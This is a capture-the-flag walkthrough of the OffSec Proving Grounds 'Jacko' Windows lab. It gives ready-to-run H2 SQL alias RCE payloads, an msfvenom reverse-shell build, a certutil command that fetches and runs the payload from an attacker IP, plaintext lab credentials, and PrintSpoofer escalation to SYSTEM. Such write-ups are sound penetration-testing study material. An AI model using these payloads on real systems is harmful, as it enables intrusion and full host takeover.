---
title: "PG: Jacko"
date: 2023-03-07
draft: false
os: "Windows"
difficulty: "Medium"
platform: "OffSec Proving Grounds"
aliases: ["/posts/offsec/jacko/"]
tags:
  - offsec
  - proving-grounds
  - medium
  - windows
  - h2-database
  - rce
  - printspoofer
  - seimpersonate
  - credential-disclosure
categories:
  - walkthrough
---

{{< box-info name="Jacko" os="Windows" difficulty="Medium" ip="192.168.89.66" platform="OffSec Proving Grounds" >}}

---

## Enumeration

### Nmap

{{< collapse title="Nmap output" >}}
```
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0 (redirects to H2 Database Engine)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
8082/tcp open  http          H2 database http console
```
{{< /collapse >}}

Windows host. Port 80 redirects to an H2 Database Engine banner, and port 8082 serves the H2 web console directly. SMB (139/445) is present but gives nothing useful as an anonymous user.

One quirk defines this box: the host firewall drops egress on everything except the ports already listening. Any download or reverse-shell callback has to ride an already-open port (80, 135, 139, 445, 8082) — plan payload delivery around that from the start.

### Port 8082 - H2 Console

The console lets you connect to the sample `jdbc:h2:~/test` database with no authentication — just hit **Connect**. The left panel then advertises the exact build:

```
H2 1.4.199 (2019-03-13)
```

H2 1.4.199 has a well-known code-execution primitive.

---

## Foothold

### H2 1.4.199 Alias RCE

H2 lets you register a Java method as a SQL alias and then `CALL` it. Using the `JNIScriptEngine.eval` gadget ([EDB-49384](https://www.exploit-db.com/exploits/49384)) you get arbitrary command execution straight from the SQL console:

```sql
CREATE ALIAS IF NOT EXISTS JNIScriptEngine_eval FOR "JNIScriptEngine.eval";
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("whoami").getInputStream()).useDelimiter("\\Z").next()');
```

The result comes back inline as a query result — code execution as `jacko\tony`:

![H2 console running whoami through the JNIScriptEngine alias, returning jacko\tony](/images/jacko/initial-access.png)

Execution is heavily constrained: `powershell.exe` is blocked, and most binaries only resolve if you call them out of `C:\Windows\system32`. `cmd`, `whoami`, `systeminfo` and `certutil` do work, so `cmd /C` is the workhorse for enumeration. Fingerprinting the host confirms a modern build — this matters for privesc later:

![systeminfo through the same RCE — Windows 10 Pro build 18363 on JACKO](/images/jacko/systeminfo.png)

### Looting the Service Config

Listing the H2 install directory with `cmd /C dir "C:\Program Files (x86)\H2\service"` surfaces a `wrapper.conf` — the Java Service Wrapper config. Reading it with `cmd /c type` leaks the service account's plaintext password:

![wrapper.conf leaking the tony service-account credentials](/images/jacko/creds.png)

```
wrapper.ntservice.account=.\tony
wrapper.ntservice.password=BeyondLakeBarber399
```

Creds `tony : BeyondLakeBarber399`. They validate over SMB (crackmapexec confirms them), but `tony` is a low-privileged local user with nothing interesting to reach that way — the real payoff is a stable, interactive shell.

### Upgrading to a Real Shell

With egress locked to open ports, stage a reverse-shell binary and pull it over port 80, then execute it — both through the same alias RCE. Build the payload with a callback on an allowed port:

```bash
# callback rides an already-open port (445) to survive the egress filter
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.89 LPORT=445 -f exe -o rev.exe
```

```sql
-- 1. stage the payload via certutil over port 80
CREATE ALIAS IF NOT EXISTS JNIScriptEngine_eval FOR "JNIScriptEngine.eval";
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("certutil.exe -urlcache -split -f http://192.168.49.89/rev.exe C:/Users/tony/Desktop/rev.exe").getInputStream()).useDelimiter("\\Z").next()');

-- 2. execute it
CREATE ALIAS IF NOT EXISTS JNIScriptEngine_eval FOR "JNIScriptEngine.eval";
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("C:\\Users\\tony\\Desktop\\rev.exe").getInputStream()).useDelimiter("\\Z").next()');
```

Catch the callback on the listener — interactive shell as `tony`.

---

## Privilege Escalation

### SeImpersonatePrivilege - PrintSpoofer

`tony` runs with `SeImpersonatePrivilege`, the classic "potato" primitive. JuicyPotato is the reflex here, but it fails — build 18363 is too recent for the DCOM/BITS trick it relies on.

[PrintSpoofer](https://github.com/itm4n/PrintSpoofer) exploits the same privilege via the print spooler's named pipe and works on current Windows 10 builds. Upload it and impersonate SYSTEM:

```
PrintSpoofer64.exe -i -c cmd
```

---

## Proof

{{< terminal title="root@jacko" >}}
C:\Windows\system32> whoami
nt authority\system
{{< /terminal >}}

![SYSTEM shell and the contents of proof.txt](/images/jacko/proof.png)

---

## Key Takeaways

{{< callout type="note" >}}
- H2 Console with an unauthenticated database and an old build (≤ 1.4.199) is instant RCE via the `JNIScriptEngine.eval` SQL-alias gadget — always fingerprint the version off the console's info panel.
- When a box firewalls all outbound except the listening ports, every download and reverse-shell callback has to reuse an already-open port. Design delivery (certutil over 80, callback on 445) around that constraint instead of fighting it.
- Service-wrapper configs (`wrapper.conf`) and similar app files routinely store plaintext service-account credentials — grep them before assuming a shell is a dead end.
- `SeImpersonatePrivilege` is game over, but pick the right potato: JuicyPotato dies on modern Windows 10 builds, PrintSpoofer keeps working.
{{< /callout >}}
